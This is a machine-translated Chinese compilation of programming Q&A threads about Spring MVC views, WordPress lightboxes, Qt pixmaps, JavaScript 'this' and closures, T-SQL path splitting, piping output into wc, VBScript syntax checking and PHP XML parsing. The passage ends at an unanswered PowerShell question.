> 标签：java, web-services, spring, rest

我已经开始使用 Spring 框架并且已经遇到了某种愚蠢的问题（但实际上我无法解决它）我的控制器看起来像：

```
package org.springframework.rest;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import org.springframework.stereotype.Controller;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class SomeController {

    @RequestMapping(value = "/", method = RequestMethod.GET)
    @ResponseBody
    public String returnHtmlPage() {

        return "page";

    }

} 
```

其中 page 是 page.jsp：

```
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<html>
<head>
    <title>Home</title>
</head>
<body>
<h1>
    Hello world!  
</h1>

<P>  The time on the server is ${serverTime}. </P>
</body>
</html> 
```

但是我只返回了字符串“page”，而不是 HTML 文件。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T12:20:15.807

您的代码只会打印出“页面”（因为@ResponseBody）。它不会为您返回网页。您可以使用“ModelAndView”而不是“String”作为方法输出。并在那里设置您的 jsp 页面名称（=page）。像这样的东西：

```
@RequestMapping(value = "/", method = RequestMethod.GET)
public ModelAndView returnHtmlPage(){
    ModelAndView model = new ModelAndView("page");
                /* here you can put anything in 'model' object that you
                   want to use them in your page.jsp file */
    return model;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T12:35:33.073

该视频将引导您完成使用 Spring MVC 构建 RESTFul 服务的所有步骤，然后使用 jQuery 使用它。[http://pluralsight.com/training/Courses/TableOfContents/springmvc-intro](http://pluralsight.com/training/Courses/TableOfContents/springmvc-intro)您还需要正确配置 ContentNegotiatingViewResolver。

# wordpress - 在没有页眉和页脚的灯箱中打开 wordpress 单个帖子

> ID：13418655
> 
> 赞同：1
> 
> 时间：2012-11-16T14:32:56.393
> 
> 标签：wordpress, lightbox

我正在开发一个插件，它需要在灯箱内打开一个 wordpress 帖子。以下是一些细节：

*   目前，我正在为灯箱使用颜色箱。触发灯箱以打开一个外部 .php 文件，该文件将帖子 ID 作为 $GET 变量接收。
*   只有标题、元信息、内容和评论部分应该在灯箱中打开，而不是主题页眉和页脚。
*   所有短代码、嵌入的 youtube 链接等都应该在打开的帖子中工作。
*   如果有一种方法可以获取当前主题的 single.php 文件，从中剥离页眉、侧边栏和页脚并仅显示格式化的内容，那就太好了。但我相信这取决于主题而不是通用解决方案

这是当前的插件链接：[http ://test.anshulsharma.in/](http://test.anshulsharma.in/)

外部 php 文件的当前代码是：

```
if(!function_exists('get_post'))
{
require_once("../../../../wp-load.php");
}
$thepost = get_post($_GET["ID"]);
$thecontent = $thepost->post_content;
$thetitle = $thepost->post_title;
$thelink = get_permalink($_GET["ID"]);
?>
    <div id="cg-post-container" style="width:<?php echo get_cg_option('lightbox_width'); ?>px;">
    <div id="cg-post-title">
    <a href="<?php echo $thelink; ?>"><?php echo $thetitle; ?></a>
    </div>
    <div id="cg-post-content">  
            <?php echo $thecontent; ?>
    </div>          
</div> 
```

在当前版本的插件中，仅显示帖子内容。简码不起作用，嵌入的链接不显示。也没有办法查看或添加评论。我愿意为此编写一个自定义的 single.php 文件并添加我自己的样式。但我只想知道最好的方法，以及如何将帖子 ID（从 $GET 变量到 single.php）传送到灯箱。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T18:17:52.947

如果您的外部页面是一个不会一直变化的精确页面，那么您的解决方案很简单。创建您的页面，让我们说：`http://yoursite.com/yourpage`。创建一个名为`page-yourpage.php`（使用与之前的页面名称相同的前缀）的页面`.php`模板，并在此模板中（您可以从中复制`single.php`），只需擦除`get_header()`并`get_footer()`在需要时添加缺少的标签（关闭`body`和`html`）。`http://yoursite.com/yourpage`使用您的灯箱链接调用该页面 ( )。所有的简码等都可以使用。完毕。否则，如果您可以访问 AJAX 调用，而不是调用 url，而是调用内部的容器。因此，而不是类似的东西：

```
jQuery("#targetcontainer").load("/yourpage/"); 
```

称呼 ：

```
jQuery("#targetcontainer").load("/yourpage/ #sourcecontainer"); 
```

# c++ - 将 QPixmap 移动到 QLabel 但不复制

> ID：13418661
> 
> 赞同：2
> 
> 时间：2012-11-16T14:33:22.540
> 
> 标签：c++, qt

我可以将 QPixmap 移动到 QLabel 中吗？我还没有找到任何支持移动语义的成员函数，或者即使在 Qt5 中，某些函数也可以将 QPixmap 移动到 QLabel 中。QLabel 的原始解决方案是复制您传递给函数的 QPixmap。

根据声明

```
setPixmap(QPixmap const &) 
```

Const& 不会增加引用计数（任何错误？）我认为他们不会共享相同的资源

并且实现看起来更像是复制而不是移动（Qt4.8.3）

```
void QLabel::setPixmap(const QPixmap &pixmap)
{
    Q_D(QLabel);
    if (!d->pixmap || d->pixmap->cacheKey() != pixmap.cacheKey()) {
        d->clearContents();
        d->pixmap = new QPixmap(pixmap);
    }

    if (d->pixmap->depth() == 1 && !d->pixmap->mask())
        d->pixmap->setMask(*((QBitmap *)d->pixmap));

    d->updateLabel();
} 
```

如果 d->pixmap 不指向任何东西或它们没有相同的 cacheKey，则 QLabel 将创建 QPixmap 的全新副本。

但我想要的行为是

```
QPixmap *temp = origin_pixmap;
origin_pixmap = new_pixmap;
temp->release() 
```

或者

```
std::string A, B;
//.............
A = std::move(B); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:45:56.597

Pixmap 实现了[Copy On Write](http://doc.qt.digia.com/qt/implicit-sharing.html)概念，因此复制 pixmap 不是一项繁重的操作，只有在尝试修改原始 pixmap 时才会发生实际的数据复制。

# regex - Notepad++ 搜索和替换 xml id

> ID：13418663
> 
> 赞同：0
> 
> 时间：2012-11-16T14:33:31.163
> 
> 标签：regex, notepad++

有没有办法在记事本++中使用唯一名称搜索和替换 name="" 属性？我只是想删除整个 name="" 属性。

notepad++ 中有什么方法可以用正则表达式来做到这一点吗？

name 属性如下所示：

```
name="myTag1" 
```

`1`唯一标识在哪里。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:35:57.463

使用此正则表达式的替换功能

```
name="myTag[0-9]+" 
```

不要忘记`regular expression`选中替换功能对话框中的复选框。

# facebook-ads-api - 达到未管理页面的估计值

> ID：13418667
> 
> 赞同：1
> 
> 时间：2012-11-16T14:33:54.580
> 
> 标签：facebook-ads-api

有什么方法可以通过连接到我不是管理员的特定页面来获得到达估计值（通过广告 API）？例如，使用该页面的管理员/洞察访问令牌或类似的东西。

# javascript - Javascript：我需要为对象中的每个变量添加 this.var 吗？

> ID：13418669
> 
> 赞同：36
> 
> 时间：2012-11-16T14:34:00.783
> 
> 标签：javascript, scope, this

在 C++ 中，我最熟悉的语言，通常会像这样声明一个对象：

```
class foo
{
public:
    int bar;
    int getBar() { return bar; }
} 
```

调用工作正常（忽略可能未初始化`getBar()`的事实）。`bar`其中的变量`bar`在`getBar()`class 的范围内`foo`，所以我不需要说`this->bar`，除非我真的需要明确指出我指的是 class'`bar`而不是参数。

现在，我正在尝试开始使用 Javascript 中的 OOP。因此，我查找了如何定义类并尝试相同的事情：

```
function foo()
{
     this.bar = 0;
     this.getBar = function() { return bar; }
} 
```

它给了我`bar is undefined`。更改`bar`来`this.bar`解决问题，但是对每个变量都这样做会使我的代码变得很混乱。这对每个变量都是必要的吗？由于我找不到与此相关的任何问题，这让我觉得我在做一些根本错误的事情。

* * *

编辑：对，所以，从评论中我得到的是`this.bar`，一个对象的属性，引用不同于`bar`局部变量的东西。有人能说出这究竟是为什么，就范围和对象而言，以及是否有另一种方法来定义一个不需要这样做的对象？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-11-16T14:52:31.727

JavaScript 没有基于~~类~~的对象模型。它使用更强大的原型继承，可以模仿类，但不太适合它。一切都是对象，对象[可以]从其他对象继承。

构造函数只是一个将属性分配给新创建的对象的函数。[`new`对象（通过使用关键字](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/new)的调用创建）可以通过[`this`关键字](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/this)（函数的本地）来引用。

方法也只是*在*对象上调用的函数 - 再次`this`指向对象。至少在将该函数作为对象的属性调用时，使用[成员运算符](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/Member_Operators)（点、括号）。这会给新手带来很多困惑，因为如果您传递该函数（例如，传递给事件侦听器），它将与访问它的对象“分离”。

现在遗产在哪里？“类”的实例继承自同一个原型对象。方法被定义为该对象的函数属性（而不是每个实例的一个函数），您调用它们的实例只是继承该属性。

例子：

```
function Foo() {
    this.bar = "foo"; // creating a property on the instance
}
Foo.prototype.foo = 0; // of course you also can define other values to inherit
Foo.prototype.getBar = function() {
    // quite useless
    return this.bar;
}

var foo = new Foo; // creates an object which inherits from Foo.prototype,
                   // applies the Foo constructor on it and assigns it to the var
foo.getBar(); // "foo" - the inherited function is applied on the object and
              // returns its "bar" property
foo.bar; // "foo" - we could have done this easier.
foo[foo.bar]; // 0 - access the "foo" property, which is inherited
foo.foo = 1;  // and now overwrite it by creating an own property of foo
foo[foo.getBar()]; // 1 - gets the overwritten property value. Notice that
(new Foo).foo;     // is still 0 
```

因此，我们确实只使用了该对象的属性并且对此感到满意。但它们都是“公共的”，可以覆盖/更改/删除！如果这不重要，你很幸运。您可以通过在属性名称前加上下划线来表示属性的“私有性”，但这只是对其他开发人员的提示，可能不会被遵守（尤其是在错误的情况下）。

因此，聪明的头脑找到了一个解决方案，使用构造函数作为闭包，允许创建私有“属性”。javascript函数的每次执行都会为局部变量创建一个新的变量环境，一旦执行完成，可能会被垃圾收集。在该范围内声明的每个函数也可以访问这些变量，并且只要可以调用这些函数（例如，通过事件侦听器），环境就必须保持不变。因此，通过从构造函数中*导出本地定义的函数*，您可以使用只能由这些函数访问的局部变量来保留该变量环境。

让我们看看它的实际效果：

```
function Foo() {
    var bar = "foo"; // a local variable
    this.getBar = function getter() {
        return bar; // accesses the local variable
    }; // the assignment to a property makes it available to outside
}

var foo = new Foo; // an object with one method, inheriting from a [currently] empty prototype
foo.getBar(); // "foo" - receives us the value of the "bar" variable in the constructor 
```

这个在构造函数内部定义的 getter 函数现在被称为“*特权*方法”，因为它可以访问“私有”（本地）“属性”（变量）。的价值`bar`永远不会改变。当然，你也可以为它声明一个 setter 函数，然后你可以添加一些验证等。

请注意，原型对象上的方法无法访问构造函数的局部变量，但它们可能会使用特权方法。让我们添加一个：

```
Foo.prototype.getFooBar = function() {
    return this.getBar() + "bar"; // access the "getBar" function on "this" instance
}
// the inheritance is dynamic, so we can use it on our existing foo object
foo.getFooBar(); // "foobar" - concatenated the "bar" value with a custom suffix 
```

因此，您可以将这两种方法结合起来。请注意，特权方法需要更多内存，因为您创建具有不同作用域链（但代码相同）的不同函数对象。如果你要创建数量惊人的实例，你应该只在原型上定义方法。

当您设置从一个“类”到另一个“类”的继承时，它变得更加复杂 - 基本上您必须使子原型对象从父对象继承，并将父构造函数应用于子实例以创建“私有属性” ”。看看[正确的 javascript 继承](https://stackoverflow.com/q/10898786/1048572)、继承原型中[的私有变量、](https://stackoverflow.com/q/3617139/1048572)[JAVASCRIPT 模块模式中的定义私有字段成员和继承](https://stackoverflow.com/q/12463040/1048572)以及[如何在 JS 显示原型模式中实现继承？](https://stackoverflow.com/q/9248655/1048572)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-16T15:12:32.430

明确表示`this.foo`（正如您已经理解的那样）您对.`foo`引用的当前对象的属性感兴趣`this`。因此，如果您使用：`this.foo = 'bar';`您将设置由equals`foo`引用的当前对象的属性。`this``bar`

JavaScript 中的`this`关键字并不总是与 C++ 中的相同。这里我可以举个例子：

```
function Person(name) {
   this.name = name;
   console.log(this); //Developer {language: "js", name: "foo"} if called by Developer
}

function Developer(name, language) {
   this.language = language;
   Person.call(this, name);
}

var dev = new Developer('foo', 'js'); 
```

在上面的示例中，我们使用函数`Person`的上下文调用函数，`Developer`因此`this`引用将由`Developer`. 正如您可能从`console.log`结果`this`中看到的那样来自`Developer`. 使用方法的第一个参数，`call`我们指定调用函数的上下文。

如果您`this`不简单地使用您创建的属性将是一个局部变量。你可能知道 JavaScript 有函数作用域，所以这就是为什么变量是局部的，只对声明它的函数可见（当然所有它都是在父函数内部声明的子函数）。这是一个例子：

```
function foo() {
    var bar = 'foobar';
    this.getBar = function () {
        return bar;
    }
}

var f = new foo();
console.log(f.getBar());  //'foobar' 
```

当您使用`var`关键字时，情况就是如此。这意味着如果您不幸`bar`忘记将成为全局变量，您将定义为局部变量。`var``bar`

```
function foo() {
    bar = 'foobar';
    this.getBar = function () {
        return bar;
    }
}

var f = new foo();
console.log(window.bar);  //'foobar' 
```

确切地说，本地范围可以帮助您实现隐私和封装，这是 OOP 的最大好处之一。

现实世界的例子：

```
function ShoppingCart() {
    var items = [];

    this.getPrice = function () {
       var total = 0;
       for (var i = 0; i < items.length; i += 1) {
          total += items[i].price;
       }
       return total;
    }

    this.addItem = function (item) {
        items.push(item);
    }

    this.checkOut = function () {
        var serializedItems = JSON.strigify(items);
        //send request to the server...
    }
}

var cart = new ShoppingCart();
cart.addItem({ price: 10, type: 'T-shirt' });
cart.addItem({ price: 20, type: 'Pants' });
console.log(cart.getPrice()); //30 
```

* * *

JavaScript 作用域的另一个好处是[模块模式](http://addyosmani.com/resources/essentialjsdesignpatterns/book/#modulepatternjavascript)。在模块模式中，您可以使用 JavaScript 的本地功能范围来模拟隐私。使用这种方法，您可以同时拥有私有属性和方法。这是一个例子：

```
var module = (function {

    var privateProperty = 42;

    function privateMethod() {
        console.log('I\'m private');
    }
    return {

       publicMethod: function () {
           console.log('I\'m public!');
           console.log('I\'ll call a private method!');
           privateMethod();
       },

       publicProperty: 1.68,

       getPrivateProperty: function () {
           return privateProperty;
       },

       usePublicProperty: function () {
           console.log('I\'ll get a public property...' + this.publicProperty);
       }

    }
}());

module.privateMethod(); //TypeError
module.publicProperty(); //1.68
module.usePublicProperty(); //I'll get a public property...1.68
module.getPrivateProperty(); //42
module.publicMethod(); 
/*
 * I'm public!
 * I'll call a private method!
 * I'm private
 */ 
```

parentless 包装匿名函数有一点奇怪的语法，但暂时忘记它（它只是在初始化后执行函数）。从使用示例中可以看出该功能，但好处主要是提供了一个简单的公共接口，它不会让您参与所有实现细节。有关该模式的更详细说明，您可以查看我在上面放置的链接。

* * *

我希望通过`this`:-) 信息可以帮助您了解 JavaScript 的一些基本主题。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-11-16T15:57:09.420

```
function Foo() {
  this.bar = 0;
  this.getBar = function () { return this.bar };
} 
```

当您使用`new`关键字调用上面的函数时 - 像这样......

```
var foo = new Foo(); 
```

... - 发生了一些事情：

1) 创建一个对象2) 使用引用该对象
的关键字执行函数。 3) 该对象被返回。 `this`

`foo`，然后，变成这个对象：

```
{
    bar: 0,
    getBar: function () { return this.bar; }
}; 
```

那么，为什么不这样做：

```
var foo = {
    bar: 0,
    getBar: function () { return this.bar; }
}; 
```

你会的，如果它只是一个简单的对象。

但是使用构造函数创建一个对象（这就是它的名称）在创建多个“相同”对象方面为我们提供了很大的优势。

请看，在 javascript 中，所有函数都是使用原型属性 [一个对象] 创建的，并且使用该函数创建的所有对象（通过使用 new 关键字调用它）都链接到该原型对象。这就是它如此酷的原因——你可以在原型对象中存储所有常用的方法（和属性，如果你想的话），并节省大量内存。这是它的工作原理：

```
function Foo( bar, bob ) {
   this.bar = bar;
   this.bob = bob;
}

Foo.prototype.calculate = function () {
  // 'this' points not to the 'prototype' object 
  // as you could've expect, but to the objects
  // created by calling Foo with the new keyword.
  // This is what makes it work.
  return this.bar - this.bob;  
};

var foo1 = new Foo(9, 5);
var foo2 = new Foo(13, 3);
var result1 = foo1.calculate();
var result2 = foo2.calculate();

console.log(result1); //logs 4
console.log(result2); //logs 10 
```

就是这样！

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-16T15:06:34.737

为了更接近 JavaScript 中的 OOP，您可能需要查看模块设计模式（例如，[在此处](http://addyosmani.com/resources/essentialjsdesignpatterns/book/)描述）。

基于闭包效果，此模式允许在您的对象中模拟私有属性。

使用“私有”属性，您可以通过其标识符直接引用它们（即，没有`this`构造函数中的关键字）。

但无论如何，JS 中的闭包和设计模式 - 一个高级主题。所以，熟悉基础知识（在前面提到的书中也有解释）。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-16T15:08:01.600

在 javascript`this`中总是指函数的所有者对象。例如，如果您`foo()`在页面中定义函数，则 owner 是 javascript 对象`windows`；或者如果您定义`foo()`on html 元素`<body>`，则所有者是 html 元素主体；同样，如果您定义了 element 的 onclick 函数`<a>`，那么所有者就是锚点。

在您的情况下，您在开始时将属性分配给`bar`“所有者”对象并尝试返回局部变量`bar`。

由于您从未定义任何本地 varialbe `bar`，因此它给您，因为 bar 未定义。

理想情况下，您的代码应该已经定义了变量，就`var bar;`好像您要返回零值一样。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-12-25T16:14:57.377

*这*就像对象（变量或函数）的公共访问修饰符，而*var*是私有访问修饰符

例子

```
var x = {}; 
x.hello = function(){
    var k = 'Hello World'; 
   this.m = 'Hello JavaScript'; 
}

var t = new x.hello(); 
console.log(t.k); //undefined
console.log(t.m); //Hello JavaScript 
```

# sql - 将字符串拆分为表格

> ID：13418681
> 
> 赞同：2
> 
> 时间：2012-11-16T14:34:36.700
> 
> 标签：sql, sql-server, string, sql-server-2008, tsql

我有一个字符串（代表文件夹路径）。最大级别数已知（子子文件夹） 最小级别数已知（根不包含文件）。文件夹名称可以包含空格。没有迹象表明示例中的 a 是文件夹还是文件.............我希望将该字符串拆分为列。

```
CREATE TABLE TESTDATA([path] [nvarchar](max))
INSERT INTO TESTDATA (path) VALUES (N'/a/)
INSERT INTO TESTDATA (path) VALUES (N'/a/ab/filename1)
INSERT INTO TESTDATA (path) VALUES (N'/a/ab/abc/filename2)
INSERT INTO TESTDATA (path) VALUES (N'/a/ab/abc/filename3)
INSERT INTO TESTDATA (path) VALUES (N'/a/ab/abc/abcd/filename4)
INSERT INTO TESTDATA (path) VALUES (N'/a/ac/ac e/filename5) 
```

TESTDATA 现在看起来像

```
|----------path-----------------|
/a
/a/ab/filename1
/a/ab/abc/filename2
/a/ab/abc/filename3
/a/ab/abc/abcd/filename4
/a/ac/ac e/filename5 
```

但我需要它看起来像

```
filename--|--root--|--folder--|--subfolder--|--subsubfolder--|
----------|--------|----------|-------------|----------------|
filename1-|---a----|----ab----|
filename2-|---a----|----ab----|-----abc-----|
filename3-|---a----|----ab----|-----abc-----|
filename4-|---a----|----ab----|-----abc-----|-------abcd-----|
filename5-|---a----|----ac----|-----ac e----| 
```

我该怎么办？

我想我应该做点什么`SUBSTRING`，`CHARINDEX`但我尝试了一千件事；永远做对了。`SUBSTRING`当字符串包含空格时，它似乎停止在字符串中搜索。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:54:53.377

使用`CHARINDEX`and`SUBSTRING`是一个很好的方法。请记住，`CHARINDEX`可以采用第三个参数来指定搜索的起点。使用它，您可以找到第二个`/`和第三个`/`，依此类推。解决问题的一种方法是使用相互构建的子查询并一次解决一小部分问题。这是一个使用连续通用表表达式将文件名分解为子文件夹级别的示例：

```
with root as (
  select
    path,
    left(path, charindex('/', path, 2) - 1) as root,
    substring(path, charindex('/', path, 2), 1000) as rest
  from testdata
), folder as (
  select
    path,
    root,
    case when charindex('/', rest, 2) > 0
      then left(rest, charindex('/', rest, 2) - 1)
      else '' 
    end as folder,
    case when charindex('/', rest, 2) > 0
      then substring(rest, charindex('/', rest, 2), 1000)
      else rest
    end as rest
  from root
), subfolder as (
  select
    path,
    root,
    folder,
    case when charindex('/', rest, 2) > 0
      then left(rest, charindex('/', rest, 2) - 1)
      else '' 
    end as subfolder,
    case when charindex('/', rest, 2) > 0
      then substring(rest, charindex('/', rest, 2), 1000)
      else rest
    end as rest
  from folder
), subsubfolder as (
  select
    path,
    root,
    folder,
    subfolder,
    case when charindex('/', rest, 2) > 0
      then left(rest, charindex('/', rest, 2) - 1)
      else '' 
    end as subsubfolder,
    case when charindex('/', rest, 2) > 0
      then substring(rest, charindex('/', rest, 2), 1000)
      else rest
    end as rest
  from subfolder
)
select
  path,
  rest as filename,
  root,
  folder,
  subfolder,
  subsubfolder
from subsubfolder; 
```

演示：[http ://www.sqlfiddle.com/#!3/e91eb/36](http://www.sqlfiddle.com/#!3/e91eb/36)

样本输出：

```
PATH                      FILENAME    ROOT  FOLDER  SUBFOLDER  SUBSUBFOLDER
------------------------  ----------  ----  ------  ---------  ------------  
/a/                       /           /a               
/a/ab/filename1           /filename1  /a    /ab          
/a/ab/abc/filename2       /filename2  /a    /ab     /abc     
/a/ab/abc/filename3       /filename3  /a    /ab     /abc     
/a/ab/abc/abcd/filename4  /filename4  /a    /ab     /abc       /abcd
/a/ac/ac e/filename5      /filename5  /a    /ac     /ac e 
```

**注意：**删除`/`我作为文件夹名称的一部分保存的 可以使用`SUBSTRING(part, 2, 1000)`或轻松完成`SUBSTITUTE(part, '/', '')`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:44:13.790

我可以为您指出一个方向（没有时间写一个解决方案）。

由于嵌套级别是已知的，因此您可以计算反斜杠的数量（也称为嵌套级别）并有一个 CASE 来处理每个场景。然后在每个 CASE 块中，获取最深级别的文件夹并更新表。您可以拥有一个 UDF，以便您可以为每个 INSERT 调用它。

假设是文件名是唯一的。

# java - 域+端口正则表达式

> ID：13418685
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:34:42.357
> 
> 标签：java, regex

我需要为 Java 应用程序创建正则表达式以查找每个`xxxxxxxx.xxxx.xxxx.xx:XXXXX`子域长度没有限制。在代码中：

```
msgEditOne = msgText.replaceAll("REGEXCODE", "replaced"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:38:23.120

这个应该做的工作......

`([a-zA-Z0-9-]+\.)*[a-zA-Z0-9-]+:[0-9]+`

# java - RestEasy 服务为浏览器请求和 Java 客户端请求返回不同的响应

> ID：13418686
> 
> 赞同：1
> 
> 时间：2012-11-16T14:34:50.850
> 
> 标签：java, web-services, resteasy

我写了一个 resteasy-spring 服务：

```
 @Controller
    @RequestMapping("/abr/asd")
    @Path("/ab/ac")
    public class JobSchedulerService {

        private static final Logger LOGGER = Logger.getLogger(JobSchedulerService.class);

        @GET
        @Path("/abc/{param}")
        public String scheduleJobs(@PathParam("param") String name) {
            return "Success";
        }
    } 
```

当我尝试从浏览器调用此服务时，响应是正确的：

```
http://localhost:8080/ControlAppWeb/rest/ab/ac/abc/name 
```

*   `Success`

但是当我尝试从 Rest Client API 调用它时，它会返回一个网页，该网页实际上是 Web 应用程序的欢迎页面，我在其中包含了 rest 服务：

```
 try {
         URL url = new URL("http://localhost:8080/WebApp/rest/ab/ac/abc/name");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();

         conn.setRequestMethod("GET");
         conn.setRequestProperty("Accept", "application/json");

         if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {
         throw new RuntimeException("Failed! " + conn.getResponseCode());
         }
         BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
         String output;

         System.out.println("Output from Server is: ");
         while ((output = br.readLine()) != null) {
         System.out.println(output);
         }
         conn.disconnect();     
         } catch (MalformedURLException e) {        
         e.printStackTrace();
         } catch (IOException e) {      
         e.printStackTrace();       
         } 
```

请帮忙，关于我从 Java API 调用时哪里出错了

此外：我尝试从服务中删除控制器和请求映射注释，浏览器调用仍然有效，而 java rest 客户端没有。奇怪的是，即使我将 url 修改为任何随机的（在 java 客户端中），不包括初始部分（http://localhost:8080/ControlAppWeb），输出保持不变并且永远不会抛出错误......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-18T17:11:26.133

这种情况下的问题似乎是由于在控制应用程序的 web.xml 中配置的“**过滤器”引起的。**因此，对 /* 的所有请求都被重定向到欢迎页面。从 web.xml 文件中删除过滤器配置解决了该问题，并且 Java Rest API 的响应与来自浏览器的调用的响应“成功”相同。虽然我仍然不清楚为什么过滤器不会影响来自浏览器的请求，但会影响来自 Java 客户端的请求。无论如何，希望这可以帮助其他可能遇到类似问题的人。

# linux - 使用带有 du 的管道来计算标准输入的“大小”

> ID：13418688
> 
> 赞同：16
> 
> 时间：2012-11-16T14:34:58.770
> 
> 标签：linux, stdin, du

我有一个程序，我从文件中加载文本，然后根据其中一个字段对其进行过滤。我感兴趣的是这个过滤步骤之后的数据大小。

理想情况下，我将能够执行以下操作：`awk '$2>=10' <myfile | du -`

我可以应用过滤器并将输出保存在某处，对其调用 du，然后删除文件，但文件很大，因此写入磁盘可能需要一段时间。

认识到它`du`代表“磁盘使用”，我怀疑我在问一些没有意义的东西，考虑到程序是如何工作的。如果有另一个通用实用程序可以做到这一点，请提出建议！

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-11-16T14:36:34.573

您可以将其通过管道传输`wc -c`到计算通过管道的字节数。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-16T14:38:17.997

`du`代表“磁盘使用情况”。管道中的数据不会命中磁盘，因此没有“du”可以使用。改为使用`wc`，即“字数”。

```
awk '$2>=10' < myfile | wc -c 
```

该`-c`标志计算字节数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-02-20T13:01:25.627

在 zsh 中，您可以：

```
du -h =(cat myfile) 
```

中的输出`=(...)`将保存在一个临时文件中，该文件的路径将替换`=(...)`. 该文件将在命令完成后被删除。

# vbscript - VBScript 验证代码的正确性而不执行它

> ID：13418693
> 
> 赞同：1
> 
> 时间：2012-11-16T14:35:23.743
> 
> 标签：vbscript, execute, correctness

您知道一个 vbs 文件如何在不执行的情况下验证另一个 vbs 文件的正确性吗？

“验证正确性”是指可以编译第二个文件而不会出错。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T17:25:24.473

1.  .ReadAll() 要检查的文件
2.  如有必要，删除“选项显式”，添加“选项显式：WScript.Quit 0”
3.  On Error Resume Next : Execute[Global] (modified) source : 处理错误

**更新：**

正如 intersum 指出的那样，我没有意识到`WScript.Quit`将终止执行（全局）它的脚本。所以无法避免使用外壳。

概念证明脚本：

```
Option Explicit

Dim goFS   : Set goFS = CreateObject("Scripting.FileSystemObject")
Dim goWS   : Set goWS = CreateObject("WScript.Shell")
Dim aFiles : aFiles   = Array("good.vbs", "bad.vbs")
Dim sFile
For Each sFile In aFiles
    WScript.Echo sFile, "==>", checkSyntax(sFile)
Next

Function checkSyntax(sFile)
  Dim sCode : sCode = goFS.OpenTextFile(sFile).ReadAll()
  WScript.StdOut.Write "  A " & sCode
  sCode = "Option Explicit : WScript.Quit 0 : " & sCode
  goFS.CreateTextFile("sctmp.vbs", True).WriteLine sCode
  WScript.StdOut.Write "  B " & goFS.OpenTextFile("sctmp.vbs").ReadAll()
  Dim oExec : Set oExec = goWS.Exec("cscript sctmp.vbs")
  Dim sOtp  : sOtp      = oExec.Stderr.ReadAll()
  If "" = sOtp Then
     checkSyntax = "ok"
  Else
     checkSyntax = sOtp
  End If
End Function 
```

输出：

```
cscript sc.vbs
  A WScript.Echo "good"
  B Option Explicit : WScript.Quit 0 : WScript.Echo "good"

good.vbs ==> ok
  A WScript.Echo "bad" : SomeSub(1, 2, 3)
  B Option Explicit : WScript.Quit 0 : WScript.Echo "bad" : SomeSub(1, 2, 3)

bad.vbs ==> M:\lib\kurs0705\xpl\sctmp.vbs(1, 73) Microsoft VBScript compilation error: Cannot use parentheses
when calling a Sub 
```

**更新二：**

从中可以看出：

```
type bad.vbs
WScript.Echo "bad" : SomeSub 1, 2, 3

cscript bad.vbs
bad
M:\lib\kurs0705\xpl\bad.vbs(1, 22) Microsoft VBScript runtime error: Type mismatch: 'SomeSub' 
```

大部分脚本执行*后*可能会出现运行时错误（输出“bad”）。要处理此类错误，您必须

1.  设计和实施强大的程序
2.  做密集测试
3.  实现 rutime 错误处理

这些要求在 VBScript 中都不是“容易的”。

# php - 从标签中的特定结果中获取 xml

> ID：13418694
> 
> 赞同：0
> 
> 时间：2012-11-16T14:35:25.327
> 
> 标签：php, xml, foreach

我目前正在使用以下代码

```
foreach ($xml->sport[0]->event[1] as $gameinfo): 
```

加载Eng。超级联赛。有没有一种方法可以从 id=3 而不是使用 [1] 方法提取数据？

XML 是：

```
<sports file_date="2012-11-16T14:30:27.853">
<sport name="Football" id="1">
    <event name="World Cup" id="1"></event>
    <event name="Eng. Premier League" id="3"></event>
    <event name="French Ligue 1" id="4"></event>
<sport> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:47:32.140

像这样做：

```
<?php

$string = '<sports file_date="2012-11-16T14:30:27.853">
<sport name="Football" id="1">
    <event name="World Cup" id="1"></event>
    <event name="Eng. Premier League" id="3"></event>
    <event name="French Ligue 1" id="4"></event>
</sport>
</sports>';

$xml = simplexml_load_string( $string );

foreach( $xml->sport->children() as $gameinfo )
{
    if( $gameinfo->attributes()->id == 3 )
    {
        // do your thing
    }
}

?> 
```

# powershell - 运行 PowerShell 时强制执行 ErrorActionPreference？

> ID：13418699
> 
> 赞同：3
> 
> 时间：2012-11-16T14:35:30.850
> 
> 标签：powershell, powershell-2.0

我们将 PowerShell 用于我们的一些自动构建脚本。不幸的是，默认情况下，PowerShell 会在出错后继续运行。

通常，我可以通过设置来改变这种行为`$ErrorActionPreference = Stop`。

我看不到对应的命令行开关`PowerShell.exe`，我们（故意）用 运行命令`-noprofile`，所以我不能把它放在那里。

如何为构建脚本执行此操作？

* * *

## 回答 #1

